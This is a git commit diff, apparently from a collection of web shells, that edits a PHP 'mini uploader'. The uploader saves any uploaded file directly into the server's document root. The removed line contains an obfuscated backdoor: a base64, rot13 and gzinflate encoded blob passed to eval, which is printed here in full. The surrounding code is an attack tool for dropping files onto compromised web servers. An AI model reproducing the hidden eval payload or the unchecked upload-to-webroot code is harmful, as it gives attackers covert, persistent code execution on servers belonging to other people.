9d1298f96fab0aae3a70000b275ee9cfa2495c94
1337r0j4n <84887432+1337r0j4n@users.noreply.github.com>
2023-10-18 22:06:22 +0630

    Add files via upload

--- SHELLs/M1N1 Upl04d3r/uploader.php
+++ SHELLs/M1N1 Upl04d3r/uploader.php
@@ -15,7 +15,7 @@ echo "<form method='post' enctype='multipart/form-data'>
 	  <input type='submit' name='upload' value='Upload!'>
 	  </form>
 	  </center>";
-$root = $_SERVER['DOCUMENT_ROOT']; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
+$root = $_SERVER['DOCUMENT_ROOT'];
 $files = $_FILES['just_file']['name'];
 $dest = $root.'/'.$files;
 if(isset($_POST['upload'])) {
